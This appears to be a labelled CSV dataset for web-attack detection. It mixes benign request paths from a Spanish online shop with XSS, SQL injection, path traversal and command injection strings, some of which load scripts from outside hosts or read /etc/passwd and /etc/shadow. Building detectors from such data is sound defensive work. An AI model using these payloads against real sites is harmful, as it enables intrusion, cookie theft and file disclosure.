payload,type
"<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"s;o1&: select * from users where id=1 or @#"";=1 or 1=1 -- 1",sqli
miembros/imagenes/castro.jpg,normal
&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;,xss
miembros/imagenes/castro.jpg,normal
imagenes/cmenbul.gif,normal
....\....\{FILE},traversal
"""><STYLE>@import""javascript:alert('XSS')"";</STYLE>",xss
index.jsp,normal
"""<xml src=""""javascript:document.write(""""XSS-XSS-XSS"""");"""">""",xss
miembros/salir.jsp,normal
global/estilos.css,normal
global/creditos.jsp,normal
imagenes/1.gif,normal
"""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",xss
imagenes/3.gif,normal
&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;,xss
publico/productos.jsp,normal
uni/**/on sel/**/ect,sqli
publico/miembros.jsp,normal
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>,xss
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",xss
' -- ,sqli
publico/registro.jsp?modo=registro&login=producti8&password=lacero&nombre=T%E1cito&apellidos=Caldes&email=scheppan-ishikawa%40tuslimites.ly&dni=20223132Z&direccion=Avinguda+Castellot%2C+116%2C+&ciudad=Benifallet&cp=26292&provincia=Girona&ntc=3591958882412356&B1=Registrar,normal
global/estilos.css,normal
global/titulo.jsp,normal
imagenes/nuestratierra.jpg,normal
"<IMG SRC=x oncopy=""alert(String.fromCharCode(88,83,83))"">",xss
admin') or ('1'='1'/*,sqli
*/a=eval;b=alert;a(b(/e/.source));/*,xss
' or ''&',sqli
<BODY ONLOAD=alert('XSS')>,xss
publico/pagar.jsp?modo=insertar&precio=8171&B1=Confirmar,normal
%uff0e%uff0e\{FILE},traversal
"<IMG SRC=x onmessage=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/cmenbul.gif,normal
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",xss
"<div STYLE=""width: expression(document.vulnerable=true);"">",xss
miembros/salir.jsp,normal
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;,xss
&#x3C,xss
"\"";alert('XSS');//",xss
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;,xss
publico/autenticar.jsp?modo=entrar&login=kaycee&pwd=Ro3eraL&remember=on&B1=Entrar,normal
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
/..\/..\/..\/..\/..\/..\/..\/..\{FILE},traversal
global/estilos.css,normal
...\...\...\{FILE},traversal
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},traversal
..%252f..%252f..%252f..%252f{FILE},traversal
'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,sqli
publico/miembros.jsp,normal
publico/productos.jsp,normal
imagenes/nuestratierra.jpg,normal
imagenes/1.gif,normal
imagenes/logo.gif,normal
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"""><img src=x onerror=javascript:alert(`A`)>",xss
imagenes/nuestratierra.jpg,normal
publico/autenticar.jsp?modo=entrar&login=beatty64&pwd=propaganda&remember=off&B1=Entrar,normal
http://www.<script>alert(1)</script .com,xss
"""<META HTTP-EQUIV=""""refresh"""" CONTENT=""""0;url=javascript:alert('XSS');"""">""",xss
"<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/3.gif,normal
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},traversal
miembros/index.jsp,normal
imagenes/logo.gif,normal
miembros/fotos.jsp,normal
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript:alert('XSS');\"">",xss
"UE1f(: select * from users where id=1 union select 1<@$,version() -- 1",sqli
publico/productos.jsp,normal
hi') or ('a'='a,sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/productos.jsp,normal
miembros/imagenes/zarauz.jpg,normal
"ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(1)"">DEF",xss
index.jsp,normal
<SCRIPT SRC=%(jscript)s?<B>,xss
miembros/imagenes/zarauz.jpg,normal
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//\;alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}",xss
"UE11f: select * from users where id=1 union select 1 $,version() -- 1",sqli
"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/imagenes/zarauz.jpg,normal
..........................................................................\..\..\..\{FILE},traversal
imagenes/1.gif,normal
publico/miembros.jsp,normal
publico/miembros.jsp,normal
"<BASE HREF=""javascript:alert('XSS');//"">",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/imagenes/castro.jpg,normal
imagenes/nuestratierra.jpg,normal
publico/carrito.jsp,normal
miembros/index.jsp,normal
index.jsp,normal
publico/productos.jsp,normal
global/estilos.css,normal
"<DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",xss
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,xss
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=43&B1=A%F1adir+al+carrito,normal
"<img """"""><script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",xss
publico/autenticar.jsp?modo=entrar&login=choong&pwd=d1se3ci%F3n&remember=off&B1=Entrar,normal
"s.:s: select * from users where id=1 or "".:""=1 or 1=1 -- 1",sqli
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=49&B1=A%F1adir+al+carrito,normal
"""<div onmouseover=""""document.write(""""XSS-XSS-XSS"""");"""">""",xss
..%252f{FILE},traversal
miembros/imagenes/ogono.jpg,normal
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>,xss
%25c0%25ae%25c0%25ae%25c0%25af{FILE},traversal
"<FRAMESET><FRAME SRC=""javascript:document.vulnerable=true;""></frameset>",xss
global/creditos.jsp,normal
imagenes/3.gif,normal
miembros/imagenes/ogono.jpg,normal
miembros/imagenes/ogono.jpg,normal
"ABC<div style=""x:\x0Cexpression(javascript:alert(1)"">DEF",xss
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE},traversal
miembros/imagenes/castro.jpg,normal
"<IMG SRC=""livescript:[code]"">",xss
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,xss
"<style>.XSS{background-image:url(""javascript:document.vulnerable=true"");}</STYLE><A CLASS=XSS></a>",xss
"<input TYPE=""IMAGE"" SRC=""javascript:document.vulnerable=true;"">",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
index.jsp,normal
global/creditos.jsp,normal
publico/pagar.jsp?modo=insertar&precio=1776&B1=Pasar+por+caja,normal
"<div style=""width: expression(document.vulnerable=true;);"">",xss
"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss
o(1)&: select * from users where id=1 %(1) or 1=1 -- 1,sqli
imagenes/logo.gif,normal
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
imagenes/cmenbul.gif,normal
global/estilos.css,normal
miembros/editar.jsp?modo=registro&login=ramani&password=3St59Et982&nombre=No%E9&apellidos=Madan+Deluca&email=mcgovern-boxter%40buscadordevideos.ag&dni=59041581Y&direccion=Antonio+Juez+67+3%3FA&ciudad=Villava%2FAtarrabia&cp=45221&provincia=Guadalajara&ntc=0512154682216503&B1=Registrar,normal
%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},traversal
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},traversal
publico/autenticar.jsp?modo=entrar&login=licia&pwd=f983Ga2783&remember=on&B1=Entrar,normal
soo1&: select * from users where id='1' <@&1 or 1=1 -- 1',sqli
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,xss
miembros/imagenes/castro.jpg,normal
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/editar.jsp?modo=registro&login=pfeilsch&password=79p2lis25&nombre=Gattas&apellidos=Izurrieta+Pomales&email=spain%40erasmusrooms.bi&dni=09220629K&direccion=Calle+Alonso+De+Matos+174%2C+&ciudad=Riodeva&cp=19219&provincia=Salamanca&ntc=9999685362950353&B1=Registrar,normal
<SCRIPT SRC=%(jscript)s?<B>,xss
publico/registro.jsp?modo=registro&login=brinn&password=huyente&nombre=Nao&apellidos=Guinaldo+Guals&email=wailing%40mariposasentudia.je&dni=52218392C&direccion=Travesia+Palacio+61%2C+1%3FD&ciudad=Vencill%F3n&cp=31439&provincia=Teruel&ntc=9129793967568864&B1=Registrar,normal
imagenes/cmenbul.gif,normal
..%%35%63{FILE},traversal
..%252f..%252f..%252f..%252f..%252f{FILE},traversal
' and 1=0) union all,sqli
global/menum.jsp,normal
imagenes/cmenbul.gif,normal
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},traversal
"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",xss
imagenes/2.gif,normal
"<! foo=""><script>javascript:alert(1)</script>"">",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"""`'><script>\x3Bjavascript:alert(1)</script>",xss
"<a href=""\x15javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE},traversal
miembros/index.jsp,normal
"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",xss
miembros/salir.jsp,normal
imagenes/2.gif,normal
"<iframe  src=""&Tab;javascript:prompt(1)&Tab;"">",xss
foo\’; alert(document.cookie);//’;,xss
"<;A HREF="";http://1113982867/"";>;XSS<;/A>;",xss
..\\\..\\\..\\\..\\\..\\\{FILE},traversal
miembros/imagenes/ogono.jpg,normal
publico/autenticar.jsp?modo=entrar&login=mcallum&pwd=garabero&remember=off&B1=Entrar,normal
global/creditos.jsp,normal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=17&B1=A%F1adir+al+carrito,normal
a;id,command_injection
"<xml src=""httP://ha.ckers.org/xsstest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>",xss
a;/usr/bin/id;,command_injection
miembros/imagenes/zarauz.jpg,normal
</plaintext\></|\><plaintext/onmouseover=prompt(1),xss
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
global/estilos.css,normal
index.jsp,normal
"<;A HREF="";//www.google.com/"";>;XSS<;/A>;",xss
miembros/fotos.jsp,normal
miembros/salir.jsp,normal
miembros/imagenes/zarauz.jpg,normal
miembros/salir.jsp,normal
miembros/imagenes/ogono.jpg,normal
&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;,xss
<h1><font color=blue>hellox worldss</h1>,xss
"&lt;SCRIPT a=\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
miembros/imagenes/zarauz.jpg,normal
miembros/imagenes/ogono.jpg,normal
..\..\\{FILE},traversal
imagenes/nuestratierra.jpg,normal
miembros/imagenes/zarauz.jpg,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
<w contenteditable id=x onfocus=alert()>,xss
publico/registro.jsp?modo=registro&login=oxendine&password=INduRaci%F3N&nombre=Artenio&apellidos=Sabadell&email=dekeyser%40creacionwebs.bn&dni=46157420P&direccion=Jesus+Jimenez%2C+86%2C+&ciudad=Albeta&cp=09580&provincia=Le%F3n&ntc=7688901932687073&B1=Registrar,normal
global/menum.jsp,normal
imagenes/nuestratierra.jpg,normal
"ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",xss
publico/pagar.jsp?modo=insertar&precio=8912&B1=Pasar+por+caja,normal
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",xss
..%c0%2f..%c0%2f{FILE},traversal
imagenes/2.gif,normal
imagenes/3.gif,normal
imagenes/2.gif,normal
miembros/imagenes/castro.jpg,normal
imagenes/logo.gif,normal
publico/productos.jsp,normal
global/menum.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(1)</script>"">",xss
miembros/fotos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",xss
"<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=73&B1=A%F1adir+al+carrito,normal
miembros/fotos.jsp,normal
"""<IMG DYNSRC=""""javascript:alert('XSS')"""">""",xss
"o1c: select * from users where id=1 <1## union select 1,version() -- 1",sqli
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>,xss
"%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E",xss
publico/caracteristicas.jsp?id=2,normal
&o.&1: select * from users where id=1 or \<\. or 1=1 -- 1,sqli
.//..//.//..//.//..//{FILE},traversal
index.jsp,normal
"""<style type=""""text/javascript"""">document.write(""""XSS-XSS-XSS"""");</style>""",xss
<!--[if]><script>javascript:alert(1)</script -->,xss
miembros/imagenes/ogono.jpg,normal
"""\"""";alert('XSS');//""",xss
"<div style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=62&B1=A%F1adir+al+carrito,normal
global/menum.jsp,normal
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;,xss
miembros/editar.jsp?modo=registro&login=raddalgo&password=enz4riz7r&nombre=Romana&apellidos=Tornos&email=wooland%40indagacion.td&dni=01498780P&direccion=C%2F+Trujillo+155+4%3FG&ciudad=Villafrech%F3s&cp=09763&provincia=Zaragoza&ntc=5719365905876928&B1=Registrar,normal
"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",xss
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,xss
miembros/imagenes/zarauz.jpg,normal
publico/miembros.jsp,normal
publico/miembros.jsp,normal
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",xss
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=26&B1=A%F1adir+al+carrito,normal
<script>({0:#0=alert/#0#/#0#(123)})</script>,xss
\..\..\..\..\..\..\..\..\..\..\etc\passwd,traversal
imagenes/2.gif,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
</XSS STYLE=xss:expression(alert('XSS'))>,xss
global/creditos.jsp,normal
">""><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>",xss
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;,xss
miembros/imagenes/castro.jpg,normal
publico/carrito.jsp,normal
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,xss
"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/nuestratierra.jpg,normal
..\..\\..\{FILE},traversal
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE},traversal
XSS STYLE=xss:e/**/xpression(alert('XSS'))>,xss
"s)(s: select * from users where id=1 or "")(""=1 or 1=1 -- 1",sqli
"s(:s: select * from users where id=1 or ""(:"" or 1=1 -- 1",sqli
miembros/fotos.jsp,normal
global/titulo.jsp,normal
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},traversal
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",xss
password:*/=1--,sqli
miembros/imagenes/zarauz.jpg,normal
publico/miembros.jsp,normal
imagenes/nuestratierra.jpg,normal
%252e%252e\{FILE},traversal
imagenes/1.gif,normal
miembros/fotos.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
index.jsp,normal
1'1,sqli
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,traversal
index.jsp,normal
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
imagenes/cmenbul.gif,normal
publico/pagar.jsp?modo=insertar&precio=7626&B1=Confirmar,normal
publico/caracteristicas.jsp?id=1,normal
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",xss
""" or 1=1--",sqli
global/menum.jsp,normal
"<event-source src=""%(event)s"" onload=""javascript:alert(1)"">",xss
publico/registro.jsp?modo=registro&login=vajentic&password=firm%E1n&nombre=Senen&apellidos=Sampedro&email=buttons%40creacionwebs.tm&dni=62123000T&direccion=C%2F+Nuestra+Se%F1ora+De+La+Merced+S%2FN+&ciudad=Nalec&cp=05591&provincia=Guadalajara&ntc=1539157605114970&B1=Registrar,normal
miembros/editar.jsp?modo=registro&login=hardin5&password=pu12%F18&nombre=Xaviera&apellidos=Melero+Benaducci&email=bourne_sereys8%40demasiado.com.ye&dni=46415307L&direccion=Calle+Tiberiades%2C+90%2C+8-F&ciudad=Banast%E1s&cp=31744&provincia=Badajoz&ntc=0799558149027812&B1=Registrar,normal
global/titulo.jsp,normal
"<IMG SRC=x oncontextmenu=""alert(String.fromCharCode(88,83,83))"">",xss
miembros/imagenes/ogono.jpg,normal
<input onfocus=javascript:alert(1) autofocus>,xss
"&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;",xss
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,xss
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>,xss
"no)UE: select * from users where id=1 + ($+) union select null,@@VERSION -- 1",sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/1.gif,normal
miembros/imagenes/ogono.jpg,normal
publico/pagar.jsp?modo=insertar&precio=7698&B1=Pasar+por+caja,normal
index.jsp,normal
"</a style=""""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')"">",xss
miembros/salir.jsp,normal
"<XSS STYLE=""behavior: url(xss.htc);"">",xss
&#60;LINK REL&#61;&#34;stylesheet&#34; HREF&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;,xss
miembros/index.jsp,normal
"<IMG SRC=""javascript:javascript:alert(1);"">",xss
"</textarea>'""><script>alert(document.cookie)</script>   ",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/registro.jsp?modo=registro&login=doan7&password=mil%E9sima&nombre=Yaideem&apellidos=Penido+Maym%27o&email=olaughlin%40pinkplanetplasencia.uy&dni=37662577P&direccion=Avenida+San+Francisco+Javier%2C+5%2C+&ciudad=D%F3lar&cp=24324&provincia=Valladolid&ntc=2781714156257998&B1=Registrar,normal
miembros/fotos.jsp,normal
miembros/fotos.jsp,normal
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",xss
publico/carrito.jsp,normal
<embed code=javascript:javascript:alert(1);></embed>,xss
"<body onLoad=""alert('XSS');""",xss
global/creditos.jsp,normal
publico/carrito.jsp,normal
miembros/editar.jsp?modo=registro&login=jean-luc&password=1zu67rado&nombre=Celio&apellidos=Magrans+Ribes&email=kurtiz_saiah4%40magadan.com.ro&dni=36930027P&direccion=Calle+Arc+De+Sant+Marti%2C+56+&ciudad=Jarandilla+de+la+Vera&cp=22234&provincia=Navarra&ntc=8871403311691449&B1=Registrar,normal
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=92&B1=A%F1adir+al+carrito,normal
imagenes/logo.gif,normal
publico/autenticar.jsp?modo=entrar&login=shuster&pwd=suti8me9te&remember=off&B1=Entrar,normal
"<TD BACKGROUND=""javascript:alert('XSS')"">",xss
' or ''-',sqli
imagenes/logo.gif,normal
publico/registro.jsp?modo=registro&login=kovacs&password=4u9_l5o&nombre=Salustio&apellidos=Orus+Pati%F1o&email=gillespie%40deuxmanagement.web&dni=78901606Z&direccion=Gregoria+Hernandez+67%2C+13G&ciudad=Ba%F1os+de+Ebro%2FMa%F1ueta&cp=08739&provincia=Guadalajara&ntc=8702699962501028&B1=Registrar,normal
publico/registro.jsp?modo=registro&login=wilson&password=mo8os7&nombre=Jaaziel&apellidos=Pirotto+Nin&email=carew1%40koinup.ni&dni=69309273S&direccion=Calle+Practicante+Calixto+Rodriguez+163%2C+&ciudad=Zael&cp=16582&provincia=A+Coru%F1a&ntc=6959239796912888&B1=Registrar,normal
"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",xss
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS",xss
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
<SCRIPT SRC=//ha.ckers.org/.j>,xss
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",xss
publico/pagar.jsp?modo=insertar&precio=6225&B1=Confirmar,normal
0 or 1=1,sqli
publico/productos.jsp,normal
' or 'x'='x,sqli
global/menum.jsp,normal
index.jsp,normal
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/estilos.css,normal
<marquee/onstart=alert()>,xss
miembros/fotos.jsp,normal
publico/caracteristicas.jsp?id=2,normal
miembros/imagenes/zarauz.jpg,normal
miembros/editar.jsp?modo=registro&login=joyan&password=hojaldrista&nombre=Mathius&apellidos=Narvate&email=pupinyo%40multaspendientes.ve&dni=08466616V&direccion=Aaiun%2C+122+12%3FF&ciudad=Andosilla&cp=17800&provincia=Le%F3n&ntc=8860654392526309&B1=Registrar,normal
